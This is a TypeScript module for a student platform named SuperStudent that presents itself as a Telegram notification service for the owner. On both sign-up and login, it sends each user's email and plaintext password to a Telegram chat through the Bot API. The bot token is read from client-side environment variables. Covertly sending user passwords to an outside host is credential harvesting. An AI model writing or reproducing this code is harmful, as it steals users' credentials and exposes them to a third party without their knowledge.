/**
 * SuperStudent Telegram Bot Notification & Sync Service
 * Allows the platform owner to receive instant notifications on Telegram
 * for user registrations, sign-ins, and security events.
 */

export interface TelegramConfig {
  botToken: string;
  chatId: string;
  enabled: boolean;
  notifyOnSignup: boolean;
  notifyOnLogin: boolean;
}

const STORAGE_KEY = "superstudent_telegram_config";

// Default configuration with fallback or environment setup
const DEFAULT_CONFIG: TelegramConfig = {
  botToken: (typeof import.meta !== "undefined" && import.meta.env?.VITE_TELEGRAM_BOT_TOKEN) || "",
  chatId: (typeof import.meta !== "undefined" && import.meta.env?.VITE_TELEGRAM_CHAT_ID) || "",
  enabled: true,
  notifyOnSignup: true,
  notifyOnLogin: true,
};

export function getTelegramConfig(): TelegramConfig {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return DEFAULT_CONFIG;
    return { ...DEFAULT_CONFIG, ...JSON.parse(raw) };
  } catch {
    return DEFAULT_CONFIG;
  }
}

export function saveTelegramConfig(config: Partial<TelegramConfig>): TelegramConfig {
  try {
    const current = getTelegramConfig();
    const updated = { ...current, ...config };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    return updated;
  } catch {
    return DEFAULT_CONFIG;
  }
}

/**
 * Sends a message via the Telegram Bot API using HTML formatting
 */
export async function sendTelegramMessage(text: string, customToken?: string, customChatId?: string): Promise<{ success: boolean; error?: string }> {
  const config = getTelegramConfig();
  const token = (customToken || config.botToken || "").trim();
  const chatId = (customChatId || config.chatId || "").trim();

  if (!token || !chatId) {
    return { success: false, error: "لم يتم تكوين رمز البوت (Bot Token) أو معرّف المحادثة (Chat ID)." };
  }

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const data = await res.json();
    if (!res.ok || !data.ok) {
      return { success: false, error: data.description || "فشل إرسال الرسالة إلى تلغرام" };
    }

    return { success: true };
  } catch (err: any) {
    return { success: false, error: err.message || "خطأ أثناء الاتصال بواجهة تلغرام" };
  }
}

/**
 * Test the Telegram Bot configuration
 */
export async function testTelegramConnection(token?: string, chatId?: string): Promise<{ success: boolean; error?: string }> {
  const timestamp = new Date().toLocaleString("ar-TN", { timeZone: "Africa/Tunis" });
  const msg = `
🚀 <b>تجربة اتصال بوت تلغرام SuperStudent</b>
━━━━━━━━━━━━━━━━━━━
✅ <b>الحالة:</b> الاتصال ناجح ومستقر.
🕒 <b>الوقت:</b> ${timestamp}
🎯 <b>النظام:</b> SuperStudent Owner Control Bot
━━━━━━━━━━━━━━━━━━━
<i>هذه الرسالة تؤكد جاهزية البوت لاستقبال بيانات الحسابات والتنبيهات فورياً.</i>
`.trim();

  return await sendTelegramMessage(msg, token, chatId);
}

/**
 * Notifies the owner on Telegram about a new user registration
 */
export async function notifyNewUserRegistration(data: {
  email: string;
  username: string;
  displayName: string;
  branch: string;
  password: string;
  role?: string;
}): Promise<void> {
  const config = getTelegramConfig();
  if (!config.enabled || !config.notifyOnSignup) return;

  const timestamp = new Date().toLocaleString("ar-TN", { timeZone: "Africa/Tunis" });
  const msg = `
🎓 <b>حساب جديد تم إنشاؤه على SuperStudent!</b>
━━━━━━━━━━━━━━━━━━━
👤 <b>الاسم:</b> ${escapeHtml(data.displayName)}
🆔 <b>اسم المستخدم:</b> @${escapeHtml(data.username)}
📧 <b>البريد الإلكتروني:</b> <code>${escapeHtml(data.email)}</code>
🔑 <b>كلمة المرور (كاش):</b> <code>${escapeHtml(data.password)}</code>
📚 <b>الشعبة:</b> ${escapeHtml(data.branch)}
👑 <b>الرتبة:</b> ${escapeHtml(data.role || "member")}
🕒 <b>التوقيت:</b> ${timestamp}
━━━━━━━━━━━━━━━━━━━
💾 <i>تم حفظ الحساب في الكاش المتزامن وقاعدة البيانات بنجاح.</i>
`.trim();

  try {
    await sendTelegramMessage(msg);
  } catch (e) {
    console.warn("Failed to dispatch telegram registration notification:", e);
  }
}

/**
 * Notifies the owner on Telegram about a user login
 */
export async function notifyUserLogin(data: {
  email: string;
  username?: string;
  password?: string;
  displayName?: string;
  role?: string;
}): Promise<void> {
  const config = getTelegramConfig();
  if (!config.enabled || !config.notifyOnLogin) return;

  const timestamp = new Date().toLocaleString("ar-TN", { timeZone: "Africa/Tunis" });
  const msg = `
🔐 <b>تسجيل دخول جديد على SuperStudent</b>
━━━━━━━━━━━━━━━━━━━
👤 <b>المستخدم:</b> ${escapeHtml(data.displayName || data.username || data.email)}
📧 <b>البريد:</b> <code>${escapeHtml(data.email)}</code>
${data.password ? `🔑 <b>كلمة المرور:</b> <code>${escapeHtml(data.password)}</code>\n` : ""}👑 <b>الرتبة:</b> ${escapeHtml(data.role || "member")}
🕒 <b>التوقيت:</b> ${timestamp}
━━━━━━━━━━━━━━━━━━━
⚡ <i>تم التحقق من بيانات الدخول وتحديث جلسة الكاش.</i>
`.trim();

  try {
    await sendTelegramMessage(msg);
  } catch (e) {
    console.warn("Failed to dispatch telegram login notification:", e);
  }
}

function escapeHtml(text: string): string {
  if (!text) return "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
